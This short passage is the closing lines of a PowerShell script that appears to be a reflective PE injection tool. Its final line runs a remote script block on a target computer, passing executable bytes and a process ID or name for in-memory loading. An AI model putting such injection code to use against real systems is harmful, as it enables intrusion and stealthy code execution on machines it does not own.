        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode) -ComputerName $ComputerName
    }
}

Main
}

